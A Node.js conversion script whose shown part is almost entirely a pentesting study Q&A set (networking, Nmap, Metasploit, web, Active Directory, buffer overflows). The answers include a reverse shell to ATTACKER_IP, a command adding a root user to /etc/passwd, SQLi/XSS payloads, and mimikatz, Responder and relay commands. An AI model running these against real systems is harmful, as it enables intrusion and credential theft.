// This script converts all remaining string-format questions in roadmap-data.js to {q, a} format
// Run with: node convert-questions.js

const fs = require('fs');
const path = require('path');

const filePath = path.join(__dirname, 'js', 'roadmap-data.js');
let content = fs.readFileSync(filePath, 'utf8');

// Expert answers database - maps question text to detailed answers
const answers = {
  // Day 2
  "What is the TCP 3-way handshake?": "1) SYN — Client sends SYN packet to server (I want to connect). 2) SYN-ACK — Server responds with SYN-ACK (OK, I acknowledge). 3) ACK — Client sends ACK (Confirmed, connection established). This creates a reliable, ordered connection. Nmap SYN scan (-sS) sends SYN but never completes the handshake (sends RST instead of ACK) — making it stealthier than a full connect scan (-sT).",
  "What is the difference between TCP and UDP?": "TCP (Transmission Control Protocol): Connection-oriented, reliable, ordered delivery, flow control, error checking. Used for: HTTP, SSH, FTP, SMTP. UDP (User Datagram Protocol): Connectionless, unreliable (no guarantee), faster, no handshake. Used for: DNS, DHCP, SNMP, streaming, gaming. For pentesters: always scan both TCP (-sS) AND UDP (-sU) — many services only run on UDP (SNMP:161, TFTP:69).",
  "What port does DNS use? HTTP? HTTPS? SSH? FTP?": "DNS: 53 (TCP/UDP), HTTP: 80 (TCP), HTTPS: 443 (TCP), SSH: 22 (TCP), FTP: 21 (control) + 20 (data) (TCP). Other critical ports: SMB: 445, RDP: 3389, Telnet: 23, SMTP: 25, POP3: 110, IMAP: 143, MySQL: 3306, PostgreSQL: 5432, SNMP: 161 (UDP), Kerberos: 88, LDAP: 389, WinRM: 5985/5986.",
  "What is the difference between well-known and ephemeral ports?": "Well-known ports: 0-1023 — reserved for standard services (HTTP:80, SSH:22, DNS:53). Registered ports: 1024-49151 — used by applications (MySQL:3306, RDP:3389). Ephemeral/dynamic ports: 49152-65535 — temporarily assigned by OS for client-side connections. When you connect to a web server on port 80, YOUR side uses a random ephemeral port (e.g., 54321).",
  "Draw the TCP 3-way handshake diagram": "Client → Server: SYN (seq=100)\nServer → Client: SYN-ACK (seq=300, ack=101)\nClient → Server: ACK (seq=101, ack=301)\n\nConnection ESTABLISHED — data flows bidirectionally.\n\nTermination (4-way):\nClient → FIN → Server\nServer → ACK → Client\nServer → FIN → Client\nClient → ACK → Server\n\nNmap SYN scan sends SYN, receives SYN-ACK (port open) or RST (closed), then sends RST instead of ACK.",

  // Day 3
  "What is DNS and how does resolution work?": "DNS (Domain Name System) translates domain names to IP addresses. Resolution process: 1) Browser checks local cache. 2) OS checks hosts file (/etc/hosts). 3) Query to recursive DNS resolver (ISP). 4) Resolver checks its cache. 5) If not cached: queries Root server → TLD server (.com) → Authoritative nameserver → Returns IP. Record types: A (IPv4), AAAA (IPv6), CNAME (alias), MX (mail), NS (nameserver), TXT (text), PTR (reverse), SOA (authority).",
  "What is DHCP and what are the 4 steps?": "DHCP (Dynamic Host Configuration Protocol) auto-assigns IP addresses. DORA process: 1) Discover — Client broadcasts 'I need an IP' (UDP 67/68). 2) Offer — DHCP server offers an available IP. 3) Request — Client requests the offered IP. 4) Acknowledge — Server confirms, client gets IP + subnet mask + gateway + DNS. DHCP attacks: Starvation (exhaust IP pool), Rogue DHCP (attacker acts as DHCP server for MITM).",
  "What is ARP and why is it important for hacking?": "ARP (Address Resolution Protocol) maps IP addresses to MAC addresses on a local network. Process: 'Who has 192.168.1.1? Tell 192.168.1.100' → Target responds with its MAC. ARP is CRITICAL for hacking because: 1) ARP has NO authentication — anyone can send fake ARP replies. 2) ARP Poisoning/Spoofing: Attacker sends fake ARP replies to redirect traffic through their machine (MITM). 3) Tools: arpspoof, ettercap, Bettercap. 4) Defense: Static ARP entries, Dynamic ARP Inspection (DAI).",
  "What is the difference between a hub, switch, and router?": "Hub (Layer 1): Broadcasts all traffic to every port — no intelligence. Obsolete. Switch (Layer 2): Uses MAC address table to forward frames only to the correct port — intelligent, fast. Router (Layer 3): Routes packets between different networks using IP addresses — connects LANs to WANs/Internet. For hackers: Hubs allow passive sniffing. Switches require ARP poisoning for MITM. Routers can be exploited via misconfigured ACLs, default credentials, or routing protocol attacks.",
  "What is a subnet mask and how does it work?": "A subnet mask defines which portion of an IP address is the network vs host part. Example: 192.168.1.100/24 (mask: 255.255.255.0) — first 24 bits = network (192.168.1.0), last 8 bits = host (.100). /24 = 256 addresses (254 usable). /25 = 128, /26 = 64, /27 = 32, /28 = 16. CIDR notation: /24, /16, /8. For pentesters: Understanding subnets helps scope network scans correctly. nmap 192.168.1.0/24 scans the entire /24 subnet.",

  // Day 4
  "What is Wireshark used for?": "Wireshark is a network protocol analyzer (packet sniffer) that captures and inspects network traffic in real-time. Uses: 1) Analyze packet headers and payloads. 2) Filter specific protocols (http, dns, tcp.port==80). 3) Follow TCP streams to reconstruct conversations. 4) Capture credentials from unencrypted protocols (HTTP, FTP, Telnet). 5) Detect ARP poisoning, DNS spoofing. 6) Analyze malware C2 traffic. Key filters: ip.addr==x.x.x.x, tcp.port==443, http.request.method==POST, dns.qry.name contains 'evil'.",
  "How do you filter HTTP traffic in Wireshark?": "Display filter: 'http' shows all HTTP traffic. More specific: 'http.request.method==GET' (GET requests), 'http.request.method==POST' (POST with credentials), 'http.response.code==200' (successful responses), 'http.host contains \"target\"' (specific domain), 'http.cookie' (session cookies). To capture credentials: filter POST requests and check packet details for form data. Capture filter (at capture time): 'port 80' or 'host 192.168.1.1'.",
  "What is the difference between a hub and a switch for sniffing?": "On a Hub: All traffic is sent to all ports — passive sniffing captures everything. Just plug in and listen. On a Switch: Traffic is only sent to the intended port (MAC table lookup). To sniff: 1) ARP poisoning (redirect traffic through you). 2) MAC flooding (overflow switch MAC table, making it act like a hub). 3) Port mirroring/SPAN port (requires switch access). 4) DHCP spoofing. Tools: arpspoof, ettercap, macof, Bettercap.",
  "What is the difference between active and passive reconnaissance?": "Passive Recon: Gathering info WITHOUT directly interacting with the target. No packets sent. Examples: WHOIS lookup, Google dorking, Shodan, social media OSINT, DNS records (public), certificate transparency logs. Active Recon: Directly interacting with the target — can be detected. Examples: Port scanning (Nmap), vulnerability scanning (Nessus), directory brute-forcing (Gobuster), banner grabbing. Passive is legal; Active requires authorization.",

  // Day 5
  "What is Kali Linux and why do hackers use it?": "Kali Linux is a Debian-based Linux distribution designed for penetration testing and digital forensics. It comes pre-installed with 600+ security tools including: Nmap (scanning), Metasploit (exploitation), Burp Suite (web testing), Wireshark (packet analysis), John the Ripper (password cracking), Aircrack-ng (wireless). Hackers use it because: all tools pre-configured, regularly updated, supports multiple architectures, can run from USB/VM/Docker/WSL. Alternative: Parrot Security OS.",
  "What Linux command shows network connections?": "1) ss -tulnp — show all listening TCP/UDP ports with process info (modern replacement for netstat). 2) netstat -tulnp — same but older. 3) ip a / ifconfig — show IP addresses. 4) ip route — show routing table. 5) cat /etc/resolv.conf — DNS servers. 6) arp -a — ARP table. 7) ss -s — connection statistics. For pentest: 'ss -tulnp' on a compromised host reveals internal services not visible from outside.",
  "What is the Linux file permission system?": "Linux uses rwx (read/write/execute) permissions for three groups: Owner, Group, Others. Format: -rwxr-xr-- (owner: rwx, group: r-x, others: r--). Numeric: r=4, w=2, x=1. chmod 755 = rwxr-xr-x. chmod 777 = rwxrwxrwx (dangerous!). SUID bit (4000): file executes as file owner, not user — critical for privilege escalation! find / -perm -4000 finds SUID binaries. SGID (2000): executes as group. Sticky bit (1000): only owner can delete files in directory.",
  "What is /etc/passwd and /etc/shadow?": "/etc/passwd: Contains user account info — readable by all. Format: username:x:UID:GID:comment:home:shell. The 'x' means password is in /etc/shadow. /etc/shadow: Contains hashed passwords — readable only by root. Format: username:$hash:last_changed:min:max:warn:inactive:expire. Hash types: $1$=MD5, $5$=SHA-256, $6$=SHA-512, $y$=yescrypt. To crack: copy both files, run 'unshadow passwd shadow > combined', then 'john combined'.",
  "What command finds SUID files?": "find / -perm -4000 -type f 2>/dev/null — finds all files with SUID bit set. SUID files execute with the FILE OWNER's privileges (usually root), not the running user's. This is a PRIMARY privilege escalation vector! Check found binaries against GTFOBins (https://gtfobins.github.io/) to see if they can be exploited. Common exploitable SUID binaries: /usr/bin/find, /usr/bin/vim, /usr/bin/python, /usr/bin/nmap (older versions), /usr/bin/pkexec.",

  // Day 6
  "What is Nmap and what are the most important flags?": "Nmap (Network Mapper) is the most essential port scanning tool. Key flags: -sS (SYN stealth scan), -sT (TCP connect), -sV (version detection), -sC (default scripts), -O (OS detection), -p- (all 65535 ports), -A (aggressive: -sV -sC -O --traceroute), -Pn (skip host discovery), -sU (UDP scan), --script=vuln (vulnerability scripts), -oN/-oX (output normal/XML). Standard pentest scan: nmap -sC -sV -p- -oN scan.txt target. Fast scan: nmap -sS -T4 --top-ports 1000 target.",
  "What is the difference between -sS and -sT?": "-sS (SYN scan): Sends SYN, receives SYN-ACK (open) or RST (closed), then sends RST — NEVER completes the handshake. Faster, stealthier, doesn't create full TCP connection in logs. Requires root/admin. -sT (Connect scan): Completes the full TCP 3-way handshake — creates a full connection. Slower, more detectable (logs show complete connections). Runs as regular user. -sS is preferred for pentesting; -sT is fallback when you can't use raw sockets.",
  "What is the most common port scan you should run?": "For a comprehensive pentest: nmap -sC -sV -p- -oN full_scan.txt TARGET. This does: -sC (default NSE scripts for service discovery), -sV (version detection), -p- (ALL 65535 ports — don't miss high-port services!), -oN (save output). Start with a quick scan: nmap -sS --top-ports 1000 -T4 TARGET, then run the full scan. Always also do UDP: nmap -sU --top-ports 100 TARGET. Save all outputs for your report.",
  "What is service version detection in Nmap?": "-sV flag makes Nmap probe open ports to determine the exact service name and version (e.g., Apache httpd 2.4.49, OpenSSH 8.2p1). This is critical because: 1) Version info reveals specific CVEs (e.g., Apache 2.4.49 has path traversal CVE-2021-41773). 2) searchsploit uses version numbers to find exploits. 3) Reports need exact versions. --version-intensity 5 (default) to 9 (try every probe). Combined with -sC, this gives maximum information about each service.",
  "What does the Nmap scripting engine (NSE) do?": "NSE allows running Lua scripts for advanced scanning. Categories: auth (authentication checks), brute (brute force), default (-sC), discovery (more info gathering), dos (denial of service), exploit (active exploitation), external (queries external services), fuzzer, intrusive, malware, safe, version, vuln (vulnerability checks). Usage: --script=vuln (check all vulns), --script=smb-enum-shares (specific script), --script=http-* (wildcard). Scripts location: /usr/share/nmap/scripts/.",

  // Day 7
  "What is the Metasploit framework?": "Metasploit is the world's most popular penetration testing framework. Components: msfconsole (main interface), Modules: exploits (code that triggers vulnerabilities), payloads (code that runs after exploitation — reverse shells, meterpreter), auxiliary (scanners, fuzzers), post (post-exploitation), encoders (AV evasion). Workflow: 1) search exploit. 2) use exploit/path. 3) set RHOSTS target. 4) set LHOST your_ip. 5) set payload. 6) exploit. Meterpreter gives a powerful post-exploitation shell with file access, keylogging, pivoting, and screenshot capabilities.",
  "What is the difference between a bind shell and a reverse shell?": "Bind Shell: Target machine OPENS a port and LISTENS for connections. Attacker connects TO the target. Problem: Firewalls usually block incoming connections. Reverse Shell: Target machine CONNECTS BACK to the attacker's machine. Attacker listens on their machine. This BYPASSES most firewalls because outgoing connections are usually allowed. Reverse shells are preferred in pentesting. Common reverse shell: bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1. Listener: nc -lvnp PORT.",
  "What is Meterpreter?": "Meterpreter is Metasploit's advanced payload — a powerful in-memory shell that runs entirely in RAM (no files on disk). Features: 1) getuid/getsystem (check/escalate privileges). 2) hashdump (dump password hashes). 3) shell (drop to OS shell). 4) upload/download (file transfer). 5) keyscan_start (keylogger). 6) screenshot (capture screen). 7) webcam_snap (camera). 8) run autoroute (pivoting). 9) migrate (move to another process). 10) persistence (survive reboot). It's encrypted and can evade basic AV.",

  // Day 9 & 10 (Linux deep dive)
  "What is privilege escalation?": "Privilege escalation is gaining higher permissions than originally granted. Two types: Vertical (user → root/admin — most common goal) and Horizontal (user A → user B — accessing another user's data). Linux vectors: SUID binaries, sudo misconfigs (sudo -l), cron jobs running as root, writable /etc/passwd, kernel exploits, capabilities, NFS no_root_squash, Docker group membership. Windows vectors: Unquoted service paths, weak service permissions, Always Install Elevated, token impersonation, DLL hijacking. Tools: LinPEAS, WinPEAS, linux-exploit-suggester.",
  "What is the /etc/passwd file format?": "Format: username:x:UID:GID:comment:home_dir:shell. Example: root:x:0:0:root:/root:/bin/bash. The 'x' means password hash is stored in /etc/shadow (not readable by normal users). If you can write to /etc/passwd, you can add a root user: echo 'hacker:$(openssl passwd -1 password123):0:0::/root:/bin/bash' >> /etc/passwd. UIDs: 0=root, 1-999=system, 1000+=regular users. /usr/sbin/nologin or /bin/false = no interactive shell access.",
  "How do you find SUID binaries?": "Command: find / -perm -4000 -type f 2>/dev/null. SUID (Set User ID) means the file runs with the owner's privileges. If owned by root and exploitable, it's a privesc path. Check each binary against: 1) GTFOBins (https://gtfobins.github.io/) — database of Unix binaries that can be exploited. 2) Custom scripts — check if the SUID binary calls other programs without full path (PATH injection). 3) Known CVEs for that binary version. Common exploitable: find, vim, bash, nmap, python, perl, less, nano.",

  // Web hacking questions
  "What is the OWASP Top 10?": "OWASP Top 10 (2021): 1) Broken Access Control — IDOR, privilege escalation. 2) Cryptographic Failures — weak encryption, exposed data. 3) Injection — SQLi, Command Injection, LDAP injection. 4) Insecure Design — flawed architecture. 5) Security Misconfiguration — default creds, verbose errors. 6) Vulnerable Components — outdated libraries/frameworks. 7) Authentication Failures — weak passwords, session issues. 8) Software & Data Integrity Failures — insecure CI/CD, deserialization. 9) Security Logging Failures — no monitoring. 10) SSRF — Server-Side Request Forgery.",
  "What is SQL injection?": "SQL injection occurs when user input is inserted directly into SQL queries without sanitization. Types: 1) In-Band (UNION-based, Error-based) — results visible in page. 2) Blind (Boolean-based: true/false responses, Time-based: SLEEP delays). 3) Out-of-Band (DNS/HTTP exfiltration). Classic test: ' OR 1=1-- in login form. UNION attack: ' UNION SELECT 1,2,3,username,password FROM users--. Automated: sqlmap -u 'url?id=1' --dbs. Prevention: Parameterized queries/prepared statements, input validation, WAF. NEVER concatenate user input into SQL.",
  "What is XSS (Cross-Site Scripting)?": "XSS injects malicious JavaScript into web pages viewed by other users. Types: 1) Reflected — payload in URL, executed when victim clicks link. 2) Stored — payload saved in database, executes for every visitor. 3) DOM-based — client-side JavaScript manipulation. Impact: Cookie theft (document.cookie), session hijacking, keylogging, phishing, defacement. Test: <script>alert(1)</script>, <img onerror=alert(1) src=x>. Prevention: Output encoding, Content Security Policy (CSP), HttpOnly cookies, input validation.",
  "What is the difference between GET and POST?": "GET: Parameters in URL (?id=1&name=test), visible in browser history/logs, cached, bookmarkable, length limited (~2048 chars), idempotent. Used for: retrieving data. POST: Parameters in request body (not visible in URL), not cached, no length limit, not idempotent. Used for: submitting data, login forms, file uploads. For pentesters: GET parameters are easier to test for injection. POST requires intercepting proxy (Burp Suite). Both can be vulnerable to injection attacks.",
  "What is Burp Suite and how is it used?": "Burp Suite is the #1 web application security testing tool. Components: 1) Proxy — intercepts and modifies HTTP/S requests between browser and server. 2) Repeater — manually modify and resend requests. 3) Intruder — automated parameter fuzzing/brute-forcing. 4) Scanner (Pro) — automated vulnerability scanning. 5) Decoder — encode/decode data. 6) Comparer — diff responses. Workflow: Set browser proxy to 127.0.0.1:8080, intercept requests, analyze parameters, test for injection/auth bypass. Essential for every web pentest.",
  "What is directory traversal?": "Directory traversal (path traversal) exploits insufficient input validation to access files outside the web root. Payload: ../../etc/passwd (Linux) or ..\\..\\windows\\system32\\config\\sam (Windows). The ../ sequence moves up one directory. Variations: %2e%2e%2f (URL encoding), ..%252f (double encoding), ....// (filter bypass). Test with Burp Suite by modifying file path parameters. Prevention: Validate input, use allowlists, chroot jails, remove ../ sequences.",

  // Active Directory
  "What is a Domain Controller?": "A Domain Controller (DC) is the server that manages Active Directory — it authenticates users, enforces group policies, manages the directory database (NTDS.dit), and handles Kerberos/LDAP requests. It stores ALL domain user credentials. Compromising a DC = owning the entire domain (all users, all computers). Ports: 88 (Kerberos), 389 (LDAP), 445 (SMB), 636 (LDAPS), 3268 (Global Catalog). In pentests, the DC is the ULTIMATE target.",
  "Explain the Kerberos authentication process": "1) AS-REQ: User sends username to KDC (Key Distribution Center on DC), encrypted with user's password hash. 2) AS-REP: KDC returns TGT (Ticket Granting Ticket) encrypted with krbtgt hash. 3) TGS-REQ: User presents TGT to request access to a specific service. 4) TGS-REP: KDC returns TGS (service ticket) encrypted with service account's hash. 5) AP-REQ: User presents TGS to the service. Attacks: AS-REP Roasting (no pre-auth), Kerberoasting (crack service ticket), Golden Ticket (forged TGT with krbtgt hash), Silver Ticket (forged TGS).",
  "What is a Golden Ticket?": "A Golden Ticket is a forged TGT (Ticket Granting Ticket) created using the krbtgt account's NTLM hash. With it, an attacker can impersonate ANY user (including Domain Admin) and access ANY service in the domain for up to 10 years (default TGT lifetime). Requirements: krbtgt hash (obtained via DCSync or NTDS.dit dump), domain SID, domain name. Tool: mimikatz 'kerberos::golden /user:Administrator /domain:corp.com /sid:S-1-5-21-... /krbtgt:HASH'. Detection: Monitor for TGTs with unusual lifetimes.",
  "What is the difference between Forest and Domain?": "Domain: A logical grouping of network objects (users, computers, groups) that share a directory database, security policies, and trust relationships. Identified by DNS name (corp.com). Forest: A collection of one or more domains that share a common schema, configuration, and global catalog. The forest is the ULTIMATE security boundary — no trust extends outside a forest by default. Trust types: Parent-Child (automatic, two-way), Tree (between trees in a forest), External (between domains in different forests).",
  "What port does LDAP use?": "LDAP (Lightweight Directory Access Protocol): Port 389 (cleartext), Port 636 (LDAPS — encrypted). Global Catalog: Port 3268 (cleartext), 3269 (encrypted). LDAP is used to query Active Directory for: users, groups, computers, OUs, GPOs. Key commands: ldapsearch -x -H ldap://DC_IP -b 'DC=corp,DC=com' (enumerate all objects). For pentesters: LDAP enumeration reveals usernames, group memberships, password policies, service accounts — all critical for further attacks.",
  "What is LLMNR poisoning?": "LLMNR (Link-Local Multicast Name Resolution) is a protocol used when DNS fails to resolve a name. It broadcasts the query on the local network. Attack: An attacker listens for LLMNR queries and responds with their own IP, tricking the victim into sending NTLM authentication hashes. Tool: Responder (python Responder.py -I eth0 -rdw). The captured NTLMv2 hash can be cracked offline with hashcat: hashcat -m 5600 hash.txt wordlist.txt. Mitigation: Disable LLMNR and NBT-NS via Group Policy.",
  "What tool performs SMB relay?": "ntlmrelayx.py (from Impacket) performs SMB relay attacks. Instead of cracking captured NTLM hashes, it relays them to another target for authentication. Requirements: SMB signing must be DISABLED on the target (default on workstations). Steps: 1) Disable SMB/HTTP in Responder.conf. 2) Run ntlmrelayx.py -tf targets.txt -smb2support. 3) Run Responder. 4) When a user authenticates, the hash is relayed to targets. Can dump SAM, execute commands, or create admin user. Check signing: crackmapexec smb 192.168.1.0/24 --gen-relay-list.",
  "What is Kerberoasting?": "Kerberoasting extracts service ticket hashes (TGS) for service accounts with SPNs (Service Principal Names) and cracks them offline. Process: 1) Enumerate SPNs: GetUserSPNs.py domain/user:pass -dc-ip DC_IP. 2) Request TGS tickets for found SPNs. 3) Extract the encrypted part (RC4/AES). 4) Crack offline: hashcat -m 13100 hashes.txt wordlist.txt. Why it works: Service accounts often have weak passwords. Any domain user can request TGS tickets. No special privileges needed. Mitigation: Strong service account passwords (25+ chars), use gMSAs, AES encryption.",
  "What is AS-REP Roasting?": "AS-REP Roasting targets accounts with 'Do not require Kerberos pre-authentication' enabled. Normally, the KDC requires the user to prove identity (pre-auth) before issuing a TGT. Without pre-auth: anyone can request a TGT for that user and crack the response offline. Tool: GetNPUsers.py domain/ -dc-ip DC_IP -usersfile users.txt -no-pass -outputfile asrep.txt. Crack: hashcat -m 18200 asrep.txt wordlist.txt. Rarer than Kerberoasting but requires no authentication at all.",
  "What is BloodHound and how do you use it?": "BloodHound is an AD attack path visualization tool that maps relationships between AD objects to find the shortest path to Domain Admin. Workflow: 1) Run SharpHound collector on compromised host: SharpHound.exe --CollectionMethods All. 2) Upload .zip to BloodHound GUI. 3) Query: 'Shortest Path to Domain Admin', 'Find Kerberoastable Users', 'Find AS-REP Roastable Users'. It reveals: group memberships, ACL abuses, delegation attacks, admin access paths. Essential for AD pentesting — shows attack paths humans would miss.",
  "What is Pass-the-Hash?": "Pass-the-Hash (PtH) uses a captured NTLM hash to authenticate WITHOUT knowing the plaintext password. NTLM authentication only requires the hash, not the password. Tools: 1) crackmapexec smb TARGET -u admin -H HASH (test access). 2) psexec.py domain/admin@TARGET -hashes :HASH (get shell). 3) evil-winrm -i TARGET -u admin -H HASH (WinRM shell). 4) wmiexec.py (WMI execution). Works because Windows stores and uses NTLM hashes directly. Mitigation: Disable NTLM, use Kerberos, enable Credential Guard, limit admin accounts.",
  "What is DCSync?": "DCSync is a technique where an attacker impersonates a Domain Controller and requests password replication data from the real DC. This dumps ALL domain user hashes including krbtgt (→ Golden Ticket). Requirement: DS-Replication-Get-Changes and DS-Replication-Get-Changes-All rights (Domain Admins, Enterprise Admins have these by default). Tool: secretsdump.py domain/admin@DC_IP (Impacket) or mimikatz 'lsadump::dcsync /user:krbtgt'. This is the FINAL step in most AD attacks — dump everything.",
  "What is the difference between Golden and Silver Ticket?": "Golden Ticket: Forged TGT using krbtgt hash. Grants access to ANY service in the domain. Valid for years. Created with: krbtgt NTLM hash, domain SID. Silver Ticket: Forged TGS using a specific service account's hash. Grants access to ONLY that specific service. Less powerful but stealthier (never touches the DC). Created with: service account NTLM hash, service SPN, domain SID. Golden = master key to the kingdom. Silver = key to one room.",
  "What tools perform lateral movement?": "1) psexec.py (Impacket) — creates a service on the remote host, uploads executable, executes. 2) wmiexec.py — uses WMI for semi-interactive shell. 3) smbexec.py — similar to psexec but uses SMB. 4) evil-winrm — uses WinRM (port 5985/5986). 5) crackmapexec — Swiss army knife for testing creds across multiple hosts. 6) xfreerdp — RDP connections. 7) PowerShell PSRemoting — Enter-PSSession. 8) PtH with any of the above. Key: try multiple methods as some may be blocked by AV/EDR.",

  // Buffer Overflow
  "What is a buffer overflow?": "A buffer overflow occurs when a program writes more data to a buffer (fixed-size memory allocation) than it can hold, overwriting adjacent memory. In exploitation: we overflow a buffer to overwrite the EIP (Extended Instruction Pointer) register, which controls the next instruction to execute. By controlling EIP, we redirect execution to our shellcode. Steps: 1) Fuzz to crash. 2) Find EIP offset (pattern_create/pattern_offset). 3) Control EIP. 4) Find bad characters. 5) Find JMP ESP address. 6) Generate shellcode. 7) Exploit!",
  "What is the EIP register?": "EIP (Extended Instruction Pointer) is a CPU register that holds the memory address of the NEXT instruction to be executed. In buffer overflow exploitation, the goal is to overwrite EIP with an address that points to our shellcode. If we control EIP, we control program flow. EIP is at a specific offset from the buffer start — we use Metasploit's pattern_create and pattern_offset to find this exact offset. On 64-bit systems, the equivalent is RIP.",
  "How do you find the offset?": "1) Generate a unique pattern: /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000 (creates 3000 unique bytes). 2) Send pattern as input to crash the program. 3) Note the value in EIP when it crashes (e.g., 39694438). 4) Find offset: pattern_offset.rb -l 3000 -q 39694438 → 'Exact match at offset 2003'. This means: after 2003 bytes of junk, the next 4 bytes overwrite EIP. Verify: send 2003 A's + 4 B's — EIP should be 42424242 (BBBB).",
  "What are bad characters?": "Bad characters are byte values that break the exploit — the application modifies or stops processing them. Common bad chars: \\x00 (null — terminates strings), \\x0a (newline), \\x0d (carriage return), \\x20 (space). To find them: send all 256 bytes (\\x01-\\xff) after EIP overflow, check in debugger which bytes are missing/modified/truncated. Remove bad chars from shellcode generation: msfvenom -b '\\x00\\x0a\\x0d'. Missing a bad char = broken shellcode = failed exploit.",
  "How do you find a JMP ESP address?": "After controlling EIP, we need it to point to our shellcode on the stack (in ESP). We can't hardcode a stack address (ASLR randomizes it). Instead, find a 'JMP ESP' instruction in a loaded DLL: 1) In Immunity Debugger: !mona jmp -r esp -cpb '\\x00' (find JMP ESP with no bad chars). 2) Choose an address from a non-ASLR module. 3) Write this address into EIP (in little-endian format). When the program hits EIP, it jumps to ESP where our shellcode waits. The JMP ESP opcode is FFE4.",

  // OSINT & Pivoting
  "What OSINT tool enumerates emails?": "theHarvester — Scrapes emails, names, subdomains, IPs from search engines. Usage: theHarvester -d target.com -b all. Other email OSINT tools: 1) hunter.io — email finder and verifier. 2) phonebook.cz — domain/email search. 3) Dehashed — leaked credential search. 4) Google: 'site:target.com @target.com'. 5) LinkedIn scraping. 6) Recon-ng — OSINT framework with email modules. 7) OSINT Framework (osintframework.com) — master list of all tools.",
  "How do you find subdomains passively?": "Passive (no direct interaction): 1) crt.sh — Certificate Transparency logs (search %.target.com). 2) SecurityTrails — DNS history. 3) VirusTotal — search domain. 4) Shodan — search ssl:target.com. 5) Amass passive mode. 6) Sublist3r. Active (direct interaction): 1) ffuf/gobuster with DNS mode. 2) Amass active mode. 3) DNS zone transfer attempt: dig axfr target.com @ns1.target.com. Combined: Subdomains reveal forgotten servers, dev environments, admin panels — high-value targets.",
  "What is Shodan used for?": "Shodan is a search engine for internet-connected devices. Unlike Google (which scrapes web pages), Shodan scans ports and indexes banner information. Uses: 1) Find exposed services: 'port:22 country:US org:\"Target Corp\"'. 2) Find IoT devices: 'webcam', 'default password'. 3) Find vulnerable servers: 'vuln:CVE-2021-44228' (Log4j). 4) Reconnaissance: 'hostname:target.com'. 5) Monitor your own exposure. Filters: port:, country:, city:, org:, os:, product:, version:. API allows programmatic queries.",
  "How do you pivot through a compromised machine?": "Pivoting uses a compromised machine to access otherwise unreachable networks. Methods: 1) SSH tunneling: ssh -L 9050:internal_ip:445 user@pivot (local port forward). 2) SSH dynamic: ssh -D 9050 user@pivot (SOCKS proxy). 3) Chisel: chisel server -p 8000 --reverse (on pivot), chisel client PIVOT_IP:8000 R:socks (on attacker). 4) Metasploit: run autoroute -s 10.10.10.0/24, then use socks_proxy + proxychains. 5) Ligolo-ng — modern tunneling. proxychains nmap/curl through the tunnel.",
  "What is the difference between SOCKS proxy and port forwarding?": "Port Forwarding: Maps ONE specific local port to ONE specific remote port through the pivot. Example: ssh -L 8080:internal:80 → localhost:8080 reaches internal:80. Limited to one service at a time. SOCKS Proxy: Creates a dynamic proxy that can route ANY traffic to ANY destination through the pivot. Example: ssh -D 9050 → proxychains nmap/curl/browser through the tunnel. SOCKS is more flexible — test multiple services without reconfiguring. proxychains.conf: socks5 127.0.0.1 9050.",
  "How does Chisel work?": "Chisel is a fast TCP/UDP tunnel, transported over HTTP (works through firewalls/proxies). Setup: 1) On attacker: chisel server -p 8000 --reverse. 2) On pivot: chisel client ATTACKER_IP:8000 R:socks. This creates a SOCKS5 proxy on the attacker's machine (port 1080). Then: proxychains nmap/curl through the tunnel. Advantages over SSH tunneling: doesn't need SSH access, HTTP-based (passes through most firewalls), portable binary (upload to compromised host). Alternative: Ligolo-ng (even easier).",
  
  // More questions
  "What was the full attack chain for Mr Robot?": "Typical attack chain: 1) Enumerate: Nmap reveals HTTP (80/443). 2) Web recon: Gobuster finds /wp-login (WordPress). 3) robots.txt reveals key file location. 4) Find username from blog/key file. 5) Brute force WordPress login with Hydra/wpscan. 6) Upload PHP reverse shell via Theme Editor (Appearance → Editor). 7) Get shell as daemon/www-data. 8) Find credentials in config files. 9) Switch to user account. 10) Privesc: Nmap SUID binary with interactive mode (nmap --interactive → !sh → root).",
  "What is your step-by-step PrivEsc methodology?": "1) System info: uname -a, cat /etc/os-release (kernel exploits). 2) Users: whoami, id, cat /etc/passwd. 3) SUID: find / -perm -4000 2>/dev/null → check GTFOBins. 4) Sudo: sudo -l (what can you run as root?). 5) Cron: cat /etc/crontab, ls -la /etc/cron.* (writable scripts?). 6) Capabilities: getcap -r / 2>/dev/null. 7) Network: ss -tulnp (internal services). 8) Files: find / -writable 2>/dev/null. 9) Passwords: grep -ri 'password' /var /etc /home. 10) Run LinPEAS: ./linpeas.sh for automated enumeration.",

  // From cert questions that might also appear in roadmap
  "What is the CIA triad?": "CIA stands for: Confidentiality (only authorized users can access data — encryption, access controls), Integrity (data hasn't been tampered with — hashing, checksums, digital signatures), Availability (systems are accessible when needed — redundancy, backups, DDoS protection). Every security decision maps back to CIA. Example: A ransomware attack targets Availability. A data breach targets Confidentiality. A man-in-the-middle attack targets Integrity.",
  "What is a Zero-Day Attack?": "A Zero-Day is a vulnerability that is unknown to the vendor and has no patch available. 'Zero days' refers to the number of days the vendor has had to fix it: zero. Zero-days are extremely valuable — sold on black markets for $50K-$2.5M+. Examples: Log4Shell (CVE-2021-44228), EternalBlue (MS17-010). Defense: Behavior-based detection, network segmentation, least privilege, threat intelligence feeds. Pentesters rarely use zero-days — they use known CVEs and misconfigurations.",

  // Interview-relevant
  "Can you explain your pentesting methodology?": "1) Pre-engagement: Scope definition, rules of engagement, NDA, emergency contacts. 2) Intelligence Gathering: OSINT, DNS recon, infrastructure mapping. 3) Threat Modeling: Identify high-value targets and likely attack paths. 4) Vulnerability Analysis: Automated scanning (Nessus/Nmap) + manual testing. 5) Exploitation: Exploit vulnerabilities for initial access — prioritize low-noise, high-impact. 6) Post-Exploitation: Privilege escalation, lateral movement, data access, pivoting. 7) Reporting: Executive summary + technical findings with CVSS scores + remediation recommendations. 8) Remediation Verification: Retest after fixes.",
  "What is the difference between a vulnerability assessment and a penetration test?": "Vulnerability Assessment: Identifies and catalogs ALL vulnerabilities using automated scanners (Nessus, Qualys). Broad coverage, no exploitation. Output: list of vulnerabilities with risk ratings. Penetration Test: Actively exploits vulnerabilities to prove real-world impact. Simulates an actual attack. Deeper but narrower. Output: attack narrative showing exploitation paths and business impact. VA answers 'What vulnerabilities exist?'. Pentest answers 'What can an attacker actually DO?'. Both are complementary.",
